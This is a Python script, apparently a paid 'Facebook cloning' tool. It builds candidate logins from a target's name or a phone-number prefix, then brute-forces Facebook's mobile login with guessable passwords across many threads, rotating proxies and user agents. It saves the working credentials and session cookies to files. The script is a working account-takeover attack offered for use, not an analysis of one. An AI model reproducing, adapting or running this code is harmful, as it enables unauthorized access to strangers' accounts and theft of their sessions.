#TOOLS CREATE BY SHA4T0

import os,sys,time,json,random,re,string,platform,base64,uuid

from bs4 import BeautifulSoup as sop

from bs4 import BeautifulSoup

import requests as ress

from datetime import date

from datetime import datetime

from time import sleep

from os import system as s

from time import sleep as waktu



import os
try:
    import requests
except ImportError:
    print('\n [✓] installing requests !...\n')
    os.system('pip install requests')

try:
    import concurrent.futures
except ImportError:
    print('\n [✓] installing futures !...\n')
    os.system('pip install futures')

try:
    import bs4
except ImportError:
    print('\n [✓] installing bs4 !...\n')
    os.system('pip install bs4')


RED = '\033[1;91m'

WHITE = '\033[1;97m'

GREEN = '\033[1;32m' #

YELLOW = '\033[1;33m'

BLUE = '\033[1;34m'

ORANGE = '\033[1;35m'

P = '\x1b[1;97m' # PUTIH

M = '\x1b[1;91m' # MERAH

H = '\x1b[1;92m' # HIJAU

K = '\x1b[1;93m' # KUNING

B = '\x1b[1;94m' # BIRU

U = '\x1b[1;95m' # UNGU

O = '\x1b[1;96m' # BIRU MUDA

N = '\x1b[0m'    # WARNA MATI

A = '\x1b[1;90m' # WARNA ABU ABU

BN = '\x1b[1;107m' # BELAKANG PUTIH

BBL = '\x1b[1;106m' # BELAKANG BIRU LANGIT

BP = '\x1b[1;105m' # BELAKANG PINK

BB = '\x1b[1;104m' # BELAKANG BIRU

BK = '\x1b[1;103m' # BELAKANG KUNING

BH = '\x1b[1;102m' # BELAKANG HIJAU

BM = '\x1b[1;101m' # BELAJANG MERAH

BA = '\x1b[1;100m' # BELAKANG ABU ABU

now = datetime.now()

dt_string = now.strftime("%H:%M")

current = datetime.now()

ta = current.year

bu = current.month

ha = current.day

today = date.today() 

loop = 0

oks = []

cps = []

ugen2=[]

ugen=[]

cokbrut=[]

ses=requests.Session()

princp=[]

try:

 prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text

 open('.prox.txt','w').write(prox)

except Exception as e:

 print('')

prox=open('.prox.txt','r').read().splitlines()

for xd in range(10000):

    a='Realme'

    b=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])

    c=random.randrange(1, 99)

    d='/Chrome/'

    e='1.6.0.'

    f=random.randrange(1, 99)

    uaku2=(f'{a}{b}{c}{d}{e}{f}')

    ugen.append(uaku2)
logo = """
\033[1;32m::::    ::::      :::     ::::    ::::  :::    ::: ::::    ::: 
\033[1;35m+:+:+: :+:+:+   :+: :+:   +:+:+: :+:+:+ :+:    :+: :+:+:   :+: 
\033[1;36m+:+ +:+:+ +:+  +:+   +:+  +:+ +:+:+ +:+ +:+    +:+ :+:+:+  +:+ 
\033[1;37m+#+  +:+  +#+ +#++:++#++: +#+  +:+  +#+ +#+    +:+ +#+ +:+ +#+ 
\033[1;31m+#+       +#+ +#+     +#+ +#+       +#+ +#+    +#+ +#+  +#+#+# 
\033[1;36m#+#       #+# #+#     #+# #+#       #+# #+#    #+# #+#   #+#+# 
\033[1;32m###       ### ###     ### ###       ###  ########  ###    ####  \x1b[0m
\033[1;32mITS \033[1;36mNOT \033[1;33mFOR \033[1;35mNAME \033[1;35mIT'S \033[1;37mBRAND
\x1b[1;97m------------------------\x1b[1;97m------------------------
\033[1;33m [✓] AUTHOR   : M4M7N
\033[1;34m [✓] GITHUB   : \033[41m\033[1;37mM4M7N\x1b[0m    
\033[1;35m [✓] Facebook :  Mamun Islam
\033[1;36m [✓] POWER  : \x1b[1;32m M4M7N\x1b[1;97m  
\033[1;32m [✓] UPDATE  : 1.1
\033[1;37m------------------------\033[1;37m------------------------"""



try:
    key1=open("/storage/emulated/0/android8.txt",'r').read()
except IOError:
    kok=open("/storage/emulated/0/android8.txt",'w')
    myid=uuid.uuid4().hex[:12]
    f="ITS-SHA4T0"
    key=myid+f
    kok.write(key)
    kok.close()
    print(key)

a=requests.get("https://github.com/M4M7N/M4M7N-XD/blob/main/approve.txt").text
b=str(a)
key1=open("/storage/emulated/0/android8.txt",'r').read()
key2=str(key1)  
if key2 in b:
    pass
    
else:
    os.system("clear")
    print(logo)
    print("\t \033[1;32m First Get Approvel\033[1;37m ")
    time.sleep(1)
    os.system("clear")
    print(logo)
    print ("")
    print(" \033[1;32m THIS TOOLS IS PAID\033[1;37m\n")
    print(" \033[1;32m SO NEED PARMETION AND ENJOY THIS TOOLS😐   \033[1;37m")
    print ("")
    print(" Your Key is Not Approved ")
    print("")
    print(" Copy And Send Key To Admin")
    print("Your key  : "+key2)
    print ("")
    name = input(" Your Name : ")
    print ("")
    gf = input(" Your gf Name : ")
    print ("")
    lol = input(" Find My Gf Name🥺 : ")
    print ("")
    input(" Press Enter To Send Key")
    time.sleep(1.5)
    tks = 'Dear%20Admin,%20Please%20Approved%20My%20Key%20To%20Premium%20%20Thanks%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20Email%20:%20'+lol+'%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20Name%20:%20'+name+'%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20%20Key%20%20:%20'+key2
    os.system('am start https://wa.me/+8801304790957?text=' + tks)
    
    exit()
class SHANTO:

    def __init__(self):

        self.id = []

        self.ok = []

        self.cp = []

        self.loop = 0

        os.system("clear")

        print(logo)

        print(" \033[95;1m[1] Facebook Email Cloning ")

        print(" \033[91;1m[2] Facebook CLONING (Name)")

        print(" \033[92;1m[3] RANDOM CLONING")

        print(" [\033[93;1m4] Contact Me ")

        print(" \033[96;1m[0] Exit")

        SHANTO = input('[➤] Choose : ')
        os.system('xdg-open https://www.facebook.com/mamun.islam.lam.sex')
        

        if SHANTO in ["1", "01"]:

            v1()

        if SHANTO in ["2", "02"]:

            v2()

        if SHANTO in ["3","03"]:

            v3()
                     	

        if SHANTO in [" 0", "00"]:

            exit()

        if SHANTO in [" 4", "04"]:

            os.system('xdg-open https://www.facebook.com/mamun.islam.lam.sex')

        else:

            exit()

def v1():

    user=[]

    os.system('clear')

    print(logo)

    kode = input(' [💉]  target fast name : ')

    kodex = input(' [💉] target last name :  ')

    print(' [🤝] example Doamin : @gmail.com, @yahoo.com ')

    doamin = input(' [📧]  Input Doamin  : ')

    limit = int(input(' \033[97;1m[\033[92;1m✓\033[97;1m]\033[1;97mEXAMPLE    \033[38;5;196m: \033[1;35m10000\033[1;97m/\033[1;34m20000\033[1;97m/\033[1;32m30000\n \033[38;5;46m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;32m•\033[1;35m•\033[1;34m•\033[1;97m•\033[1;33m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[38;5;196m•\033[1;32m•\033[1;97m•\033[1;35m•\033[1;34m•\033[1;33m•\033[38;5;46m•\033[1;97m•\033[38;5;46m•\033[38;5;196m•\033[38;5;46m•\033[38;5;196m•\n \033[97;1m[\033[92;1m?\033[97;1m]\033[1;97mCRACK LIMIT \033[38;5;196m:\033[97;1m '))  
    

    for nmbr in range(limit):

        nmp = ''.join(random.choice(string.digits) for _ in range(1,4))

        user.append(nmp)

    with ThreadPool(max_workers=30) as yaari:

        os.system('clear')

        print(logo)

        tl = str(len(user))

        print(' [♥]  Total ids:\033[1;92m '+tl)

        print(f"\033[1;97m [♥]  Target Doamin:\033[1;92m {doamin}")

        print(' \033[1;97m[♥]  The process has been started')

        print(' [♥]  Wait for ids ')

        print(50*'_')

        for guru in user:

            uid = kode+kodex+guru+doamin

            pwx = [kode,kodex,kode+kodex,kode+'123',kode+'1234',kode+'12345',kode+guru,kodex+'123',kodex+'1234',kodex+'12345']

            yaari.submit(rcrack1,uid,pwx,tl)

    print(50*'_')

    print(' [♥] Crack process has been completed')

    print(' [♥] Ids saved in ok.txt,cp.txt')

    print(50*'_')

def v2():

    user=[]

    os.system('clear')

    print(logo)

    kode = input(' [💉]  target fast name : ')

    kodex = input(' [💉] target last name :  ')

    doamin = '.'

    limit = int(input(' \033[97;1m[\033[92;1m✓\033[97;1m]\033[1;97mEXAMPLE    \033[38;5;196m: \033[1;35m10000\033[1;97m/\033[1;34m20000\033[1;97m/\033[1;32m30000\n \033[38;5;46m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;32m•\033[1;35m•\033[1;34m•\033[1;97m•\033[1;33m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[38;5;196m•\033[1;32m•\033[1;97m•\033[1;35m•\033[1;34m•\033[1;33m•\033[38;5;46m•\033[1;97m•\033[38;5;46m•\033[38;5;196m•\033[38;5;46m•\033[38;5;196m•\n \033[97;1m[\033[92;1m?\033[97;1m]\033[1;97mCRACK LIMIT \033[38;5;196m:\033[97;1m '))  
    
    for nmbr in range(limit):

        nmp = ''.join(random.choice(string.digits) for _ in range(1,4))

        user.append(nmp)

    with ThreadPool(max_workers=30) as yaari:

        os.system('clear')

        print(logo)

        tl = str(len(user))

        print(' [♥]  Total ids:\033[1;92m '+tl)

        print(f"\033[1;97m [♥]  Target Doamin:\033[1;92m Facebook CLONING (name)")

        print(' \033[1;97m[♥]  The process has been started')

        print(' [♥]  Wait for ids ')

        print(50*'_')

        for guru in user:

            uid = kode+doamin+kodex+guru

            pwx = [kode,kodex,kode+kodex,kode+'123',kode+'1234',kode+'12345',kode+guru,kodex+'123',kodex+'1234',kodex+'12345']

            yaari.submit(rcrack1,uid,pwx,tl)

    print(50*'_')

    print(' [♥] Crack process has been completed')

    print(' [♥] Ids saved in ok.txt,cp.txt')

    print(50*'_')

def v3():

    user=[]

    os.system('clear')

    print(logo)
    
    limit = int(input(' \033[97;1m[\033[92;1m✓\033[97;1m]\033[1;97mEXAMPLE    \033[38;5;196m: \033[1;35m10000\033[1;97m/\033[1;34m20000\033[1;97m/\033[1;32m30000\n \033[38;5;46m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;32m•\033[1;35m•\033[1;34m•\033[1;97m•\033[1;33m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[38;5;196m•\033[1;32m•\033[1;97m•\033[1;35m•\033[1;34m•\033[1;33m•\033[38;5;46m•\033[1;97m•\033[38;5;46m•\033[38;5;196m•\033[38;5;46m•\033[38;5;196m•\n \033[97;1m[\033[92;1m?\033[97;1m]\033[1;97mCRACK LIMIT \033[38;5;196m:\033[97;1m '))  
    
    print(' [✔] For BD, Enter 3 Digit Code [ Ex- 017,019,018,013,016 ]')
    kode = input(' [💉] Enter sim code: ')

    kodex = ''.join(random.choice(string.digits) for _ in range(2))

    kod = ''.join(random.choice(string.digits) for _ in range(2))

    doamin = ' RANDOM CLONING '

    for nmbr in range(limit):

        nmp = ''.join(random.choice(string.digits) for _ in range(4))

        user.append(nmp)

    with ThreadPool(max_workers=30) as yaari:

        os.system('clear')

        print(logo)

        tl = str(len(user))

        print("\033[38;5;46m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;32m•\033[1;35m•\033[1;34m•\033[1;97m•\033[1;33m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[38;5;196m•\033[1;32m•\033[1;97m•\033[1;35m•\033[1;34m•\033[1;33m•\033[38;5;46m•\033[1;97m•\033[38;5;46m•\033[38;5;196m•\033[38;5;46m•\033[38;5;196m•")
        print('\033[97;1m[\033[92;1m✓\033[97;1m]\033[97;1mSIM CODE : \033[1;97m'+kode)
        print('\033[97;1m[\033[92;1m✓\033[97;1m]\033[97;1mTOTAL IDS : \033[1;92m'+tl)
        print('\033[97;1m[\033[92;1m✓\033[97;1m]\033[97;1mUSE MOBILE DATA OR WIFI ')
        print('\033[97;1m[\033[92;1m✓\033[97;1m]\033[1;97mFIRST \033[1;34m[\033[1;32mON\033[1;97m/\033[38;5;196mOFF\033[1;34m] \033[1;97mAIRPLANE MODE ')
        print("\033[38;5;46m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;32m•\033[1;35m•\033[1;34m•\033[1;97m•\033[1;33m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[38;5;196m•\033[1;32m•\033[1;97m•\033[1;35m•\033[1;34m•\033[1;33m•\033[38;5;46m•\033[1;97m•\033[38;5;46m•\033[38;5;196m•\033[38;5;46m•\033[38;5;196m•")


        for guru in user:

            uid = kode+kodex+kod+guru

            pwx = [kode+kodex+kod+guru,kod+guru,kodex+guru,kode+kodex+kod,'bangladesh']

            yaari.submit(rcrack1,uid,pwx,tl)

    print(50*'_')

    print(' [♥] Crack process has been completed')

    print(' [💜] Ids saved in ok.txt,cp.txt')

    print(50*'_')

def rcrack1(uid,pwx,tl):

    global loop

    global cps

    global oks

    global proxy

    try:

        for ps in pwx:

            pro = random.choice(ugen)

            session = requests.Session()

            sys.stdout.write('\r[\033[1;92mMAMUN\033[1;97m] [%s/%s] [\033[1;92mOK\033[1;97m:-\033[1;92m%s\033[1;97m] [\033[1;91mCP\033[1;97m:-\033[1;91m%s\033[1;97m] \r'%(loop,tl,len(oks),len(cps))),

            sys.stdout.flush()

            free_fb = session.get('https://free.facebook.com').text

            log_data = {

                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),

            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),

            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),

            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),

            "try_number":"0",

            "unrecognized_tries":"0",

            "email":uid,

            "pass":ps,

            "login":"Log In"}

            header_freefb = {
    'authority': 'm.facebook.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'no-cache, no-store, must-revalidate',
    'referer': 'https://m.facebook.com',
    'sec-ch-ua': '"Google Chrome";v="90", "Not)A;Brand";v="8", "Chromium";v="75"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',
}
            lo = session.post('https://m.facebook.com/login/device-based/login/async/',data=log_data,headers=header_freefb).text

            log_cookies=session.cookies.get_dict().keys()

            if 'c_user' in log_cookies:

                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])

                cid = coki[7:22]

                print(f"\033[38;5;46m[MAMUN-OK] {uid}|{ps}")

                print(f" \n Cookie : {coki}")

                print(f" \n ══════════════════════════════════════════")


                open('/sdcard/MAMUN/ok.txt', 'a').write( uid+' | '+ps+'\n')

                oks.append(uid)

                break

            elif 'checkpoint' in log_cookies:

                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])

                cid = coki[82:97]

                print(f"\x1b[38;5;196m[MAMUN-CP] {cid}|{ps}")

                open('/sdcard/MAMUN-CP.txt', 'a').write( uid+' | '+ps+' \n')

                cps.append(uid)

                break

            else:

                continue

        loop+=1

        sys.stdout.write(f'\r\033[m[M4M7N] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),

        sys.stdout.flush()

    except:

        pass

SHANTO()
